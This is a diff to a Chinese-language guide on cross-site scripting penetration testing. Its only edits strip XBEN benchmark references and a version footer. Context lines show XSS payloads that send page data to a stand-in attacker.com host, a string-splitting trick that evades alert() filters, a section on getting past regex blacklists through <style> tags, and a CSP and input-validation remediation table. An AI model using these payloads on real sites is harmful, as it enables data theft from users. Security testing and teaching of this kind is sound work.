@@ -237,7 +237,7 @@ fetch('http://attacker.com/log', {
 location='http://attacker.com/?'+document.title.split(': ')[1]
 ```
 
-##### 2.4.5 黑名单 `<style>` 标签绕过技术（XBEN-015-24 实战技术）
+##### 2.4.5 黑名单 `<style>` 标签绕过技术
 
 **场景：应用使用正则黑名单过滤，但明确允许 `<style>` 标签**
 
@@ -440,8 +440,3 @@ a='al';b='ert';window[a+b](1)
 | 无 CSP 保护 | 添加 Content-Security-Policy 头 |
 | 无输入验证 | 实施严格的输入验证和输出编码 |
 
----
-
-**文档版本：** 1.0  
-**最后更新：** 2026 年 3 月  
-**参考来源：** XBEN-014-24 渗透测试实战分析
